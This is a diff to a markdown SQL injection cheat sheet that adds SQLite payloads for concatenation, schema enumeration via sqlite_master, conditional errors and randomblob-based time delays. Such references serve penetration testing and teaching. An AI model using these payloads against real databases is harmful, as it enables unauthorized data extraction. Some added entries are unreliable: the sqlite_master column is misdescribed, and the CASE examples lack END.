@@ -13,6 +13,7 @@
   - `'foo' 'bar'` [Note the space between the two strings]
   - `CONCAT('foo','bar')`
   - `CONCAT(col1,col2...)`
+- SQLite `'foo'||'bar'`
 
 ### Substring
 **Remember: Index starts from 1**
@@ -20,6 +21,7 @@
 - Microsoft	`SUBSTRING('foobar', 4, 2)`
 - PostgreSQL `SUBSTRING('foobar', 4, 2)`
 - MySQL	`SUBSTRING('foobar', 4, 2)`
+- SQLite `SUBSTR('foobar', 4, 2)`
 
 ### Comment
 - Oracle 	`--comment`
@@ -33,6 +35,7 @@
   - `#comment`
   - `-- comment` *[Note the space after the double dash]*
   - `/*comment*/`
+- SQLite ` -- comment` *[Only comments out a single line]*
 
 ### Database version
 - Oracle
@@ -55,6 +58,11 @@ You can list the tables that exist in the database, and the columns that those t
 - PostgreSQL
   - `SELECT * FROM information_schema.tables`
   - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
+
+- SQLite
+  `SELECT sql,name FROM sqlite_master WHERE type='table'`
+  'sql' column is the schema (database) name, 'name' is the name of the table in that schema.
+
 - MySQL
 
 **Information:**
@@ -88,6 +96,7 @@ You can test a single boolean condition and trigger a database error if the cond
 - Microsoft `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
 - PostgreSQL `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`
 - MySQL `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') `
+- SQLite `CASE WHEN key='value1' THEN 'something' WHEN key='value2' THEN 'somethingelse'` *[Use this to cause errors]*
 
 ### Batched (or stacked) queries
 
@@ -106,6 +115,7 @@ You can cause a time delay in the database when the query is processed. The foll
 - Microsoft `WAITFOR DELAY '0:0:10'`
 - PostgreSQL `SELECT pg_sleep(10)`
 - MySQL	`SELECT sleep(10)`
+- SQLite `SELECT 1=randomblob(100000000)`
 
 ### Conditional time delays
 
@@ -115,6 +125,7 @@ You can test a single boolean condition and trigger a time delay if the conditio
 - Microsoft `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
 - PostgreSQL `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
 - MySQL	`SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`
+- SQLite `CASE col_name WHEN 'something' THEN 1=randomblob(100000000) ELSE 1=randomblob(0)` *causes time delay if col_name='something'*
 
 ### DNS lookup
 
